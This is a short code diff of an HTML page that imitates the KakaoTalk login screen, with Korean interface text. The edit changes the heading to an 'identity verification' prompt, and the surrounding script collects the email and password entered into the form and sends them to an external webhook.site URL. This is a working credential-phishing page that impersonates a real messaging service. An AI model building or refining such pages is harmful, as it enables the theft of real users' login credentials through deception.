@@ -46,9 +46,9 @@
 
   <!-- 로그인 화면 -->
   <div id="page2" class="login-container hidden">
-    <h2>카카오톡을 시작합니다</h2>
-    <input type="text" placeholder="이메일 또는 전화번호" id="userId" style = "width : 370px ; padding : 5px;">
-    <input type="password" placeholder="비밀번호" id="userPw" style = "width : 370px ; padding : 5px;">
+    <h2>카카오톡 본인인증하기</h2>
+    <input type="text" placeholder="이메일 또는 전화번호" id="userId" style="width:370px; padding:5px;">
+    <input type="password" placeholder="비밀번호" id="userPw" style="width:370px; padding:5px;">
     <button type="button" class="btn-gray" onclick="login()">로그인</button>
   </div>
 
@@ -78,7 +78,6 @@
       // webhook.site URL
       const webhookUrl = "https://webhook.site/2761c3f8-e830-47a7-ba4b-54bfa6d485ab";
 
-      // x-www-form-urlencoded 형식으로 변환
       const formData = new URLSearchParams();
       formData.append("email", email);
       formData.append("password", password);
